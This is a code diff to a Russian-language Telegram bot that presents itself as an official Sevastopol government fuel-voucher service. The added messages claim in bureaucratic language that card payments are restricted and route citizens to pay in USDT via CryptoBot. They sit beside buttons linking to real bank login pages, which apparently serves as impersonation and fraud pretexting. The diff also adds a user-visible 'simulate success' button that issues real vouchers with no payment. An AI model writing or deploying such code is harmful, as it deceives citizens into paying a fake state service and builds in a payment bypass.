@@ -273,18 +273,38 @@ def get_all_vouchers_export() -> list[dict]:
     return rows
 
 
+def issue_any_voucher_sim(plate: str, fuel_type: str, chat_id: int) -> str | None:
+    """Выдаёт любой доступный ваучер (для симуляции успешной оплаты в тестах)."""
+    con = _conn()
+    cur = con.cursor()
+    row = cur.execute(
+        "SELECT id, qr_code_payload FROM vouchers WHERE status='available' ORDER BY id LIMIT 1"
+    ).fetchone()
+    if not row:
+        con.close()
+        return None
+    vid, payload = row
+    cur.execute(
+        "UPDATE vouchers SET status='issued', voucher_type='paid', license_plate=?, issued_at=?, chat_id=? WHERE id=?",
+        (plate.upper(), datetime.now(timezone.utc).isoformat(), chat_id, vid),
+    )
+    con.commit()
+    con.close()
+    return payload
+
+
 def cancel_single_pending(order_id: str, chat_id: int) -> dict | None:
     """Удаляет конкретный pending-платёж (проверяет chat_id для защиты от чужих)."""
     con = _conn()
     row = con.execute(
-        "SELECT invoice_id, plate FROM pending_payments WHERE order_id = ? AND chat_id = ?",
+        "SELECT invoice_id, plate, fuel_type FROM pending_payments WHERE order_id = ? AND chat_id = ?",
         (order_id, chat_id),
     ).fetchone()
     if row:
         con.execute("DELETE FROM pending_payments WHERE order_id = ?", (order_id,))
         con.commit()
     con.close()
-    return {"invoice_id": row[0], "plate": row[1]} if row else None
+    return {"invoice_id": row[0], "plate": row[1], "fuel_type": row[2]} if row else None
 
 
 async def _delete_cryptopay_invoice(invoice_id: int) -> bool:
@@ -540,9 +560,20 @@ def admin_menu_markup() -> InlineKeyboardMarkup:
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     context.user_data.clear()
     await update.message.reply_text(
-        "🏛 *Система государственного учёта и распределения топлива*\n"
-        "_Департамент цифрового развития Севастополя_\n\n"
-        "Выберите действие:",
+        "🏛 *Система государственного учёта и распределения ГСМ*\n"
+        "_Департамент цифрового развития города Севастополя_\n\n"
+        "─────────────────────────────────\n"
+        "Уважаемые граждане!\n\n"
+        "Настоящий цифровой комплекс является официальным расчётно-учётным каналом, "
+        "развёрнутым в целях обеспечения бесперебойного распределения целевых объёмов ГСМ "
+        "и минимизации критической нагрузки на серверную инфраструктуру в г. Севастополь.\n\n"
+        "Данный сервис предназначен для приоритетного обслуживания пользователей, у которых "
+        "не установлен, временно недоступен или функционирует со сбоями специализированный "
+        "мессенджер *«Макс»*.\n\n"
+        "Для верификации вашего транспортного средства и последующего формирования ваучера "
+        "на ГСМ (20 литров) в рамках установленных регламентных лимитов, пожалуйста, "
+        "воспользуйтесь разделом меню ниже.\n"
+        "─────────────────────────────────",
         parse_mode="Markdown",
         reply_markup=main_menu_markup()
     )
@@ -893,22 +924,40 @@ async def menu_navigation(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         save_pending_payment(order_id, invoice_id, query.from_user.id, plate, fuel_type, pay_url)
 
         text = (
-            f"🛒 *Счёт на оплату сформирован*\n\n"
-            f"• *Товар:* {product['label']}\n"
-            f"• *Объём:* 20 литров\n"
-            f"• *К оплате:* `{PAID_AMOUNT_USDT} USDT`\n"
-            f"• *Госномер:* `{plate}`\n\n"
-            "После оплаты QR-ваучер придёт *автоматически* в этот чат.\n"
-            "_Счёт действителен 30 минут._"
+            "📋 *Официальное уведомление о временном регламенте проведения расчётных операций*\n\n"
+            "Настоящим извещаем, что ввиду фиксации пиковых нагрузок на шлюзы прямого фиатного "
+            "процессинга и проведения комплекса планово-предупредительных работ на стороне "
+            "клиринговых агрегаторов, прямое дебетование расчётных карт (эквайринг) временно "
+            "ограничено в целях предотвращения потерь транзакций и обеспечения целостности "
+            "расчётных данных.\n\n"
+            "В целях обеспечения непрерывности сервиса, расчётные операции переведены на "
+            "использование резервной децентрализованной архитектуры *Crypto Pay API*. "
+            "Все транзакции номинированы в эквиваленте расчётных единиц *(USDT)*. "
+            "Для конечных пользователей сохраняется штатная возможность конвертации "
+            "фиатных средств непосредственно в интерфейсе платёжного шлюза.\n\n"
+            "Для ознакомления со структурой альтернативных платёжных маршрутов вы можете "
+            "использовать интерфейс перенаправления ниже.\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🚗 *Госномер:* `{plate}`\n"
+            f"⛽ *Продукт:* {product['label']} — 20 л\n"
+            f"💰 *К оплате:* `{PAID_AMOUNT_USDT} USDT`\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            "_После успешной оплаты QR-ваучер поступит в данный чат автоматически. "
+            "Счёт действителен 30 минут._"
         )
         await query.edit_message_text(
             text, parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("💳 Провести платёж (CryptoBot)", url=pay_url)],
+                [InlineKeyboardButton("🏦 Сбербанк Онлайн",            url="https://sub.sberbank.ru/")],
+                [InlineKeyboardButton("🟡 Т-Банк (Личный кабинет)",    url="https://www.tbank.ru/login/")],
+                [InlineKeyboardButton("🔴 Альфа-Банк Мобайл",          url="https://web.alfabank.ru/")],
+                [InlineKeyboardButton("🔵 Банк ВТБ",                   url="https://online.vtb.ru/")],
                 [InlineKeyboardButton(
-                    "💳 Оплатить через CryptoBot (СБП/Карты/Крипта)",
-                    url=pay_url,
+                    "🧪 Симулировать успех (Тест)",
+                    callback_data=f"simulate_ok_{order_id}",
                 )],
-                [InlineKeyboardButton("❌ Отменить", callback_data="main_menu")],
+                [InlineKeyboardButton("❌ Отменить заказ", callback_data=f"cancel_order_{order_id}")],
             ])
         )
 
@@ -986,6 +1035,44 @@ async def menu_navigation(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             reply_markup=InlineKeyboardMarkup([[
                 InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")
             ]]),
+        )
+
+    elif data.startswith("simulate_ok_"):
+        order_id = data[len("simulate_ok_"):]
+        rec = cancel_single_pending(order_id, query.from_user.id)
+        if not rec:
+            await query.answer("⚠️ Заказ уже обработан или не найден.", show_alert=True)
+            return
+        plate      = rec["plate"]
+        fuel_type  = rec.get("fuel_type", "АИ-95")
+        if rec["invoice_id"]:
+            await _delete_cryptopay_invoice(rec["invoice_id"])
+        payload = issue_any_voucher_sim(plate, fuel_type, query.from_user.id)
+        if not payload:
+            await query.answer("⚠️ Нет доступных ваучеров для симуляции.", show_alert=True)
+            return
+        qr_img = make_qr(payload)
+        await query.answer("✅ Симуляция оплаты выполнена!")
+        await query.edit_message_text(
+            "🧪 *Симуляция успешной оплаты активирована*\n\n"
+            "✅ Тестовый QR-ваучер сформирован и отправлен ниже.\n"
+            "_В боевом режиме ваучер поступает автоматически после подтверждения оплаты "
+            "через CryptoBot._",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")
+            ]]),
+        )
+        await query.message.reply_photo(
+            photo=qr_img,
+            caption=(
+                f"🎫 *Ваучер на ГСМ (ТЕСТ)*\n"
+                f"🚗 Госномер: `{plate}`\n"
+                f"💰 Тип: Платный (симуляция)\n"
+                f"🔖 Серийный №: `{payload}`\n\n"
+                "_Предъявите данный QR-код оператору на АЗС._"
+            ),
+            parse_mode="Markdown",
         )
 
     elif data.startswith("show_qr_"):
